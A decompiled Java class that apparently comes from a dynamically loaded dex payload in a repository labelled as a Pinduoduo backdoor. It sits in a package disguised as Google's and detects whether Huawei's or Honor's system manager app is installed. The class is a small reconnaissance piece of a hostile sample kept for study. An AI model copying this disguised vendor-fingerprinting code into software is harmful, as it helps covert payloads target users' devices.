package com.google.android.sd.biz_dynamic_dex.hw_db_handler;

import android.content.Context;

public class ManagerPkgGetOnHw {
  private static final String HONOR_MANAGER_PKG = "com.hihonor.systemmanager";
  
  private static final String HW_MANAGER_PKG = "com.huawei.systemmanager";
  
  public static String getManagerPkgName(Context paramContext) {
    return isPkgExist(paramContext, "com.huawei.systemmanager") ? "com.huawei.systemmanager" : (isPkgExist(paramContext, "com.hihonor.systemmanager") ? "com.hihonor.systemmanager" : "com.huawei.systemmanager");
  }
  
  private static boolean isPkgExist(Context paramContext, String paramString) {
    try {
      paramContext.getPackageManager().getApplicationInfo(paramString, 8192);
      return true;
    } catch (Exception exception) {
      return false;
    } 
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\8c34f5dc-f04c-40ba-98d4-7aa7c364b65c-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\hw_db_handler\ManagerPkgGetOnHw.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */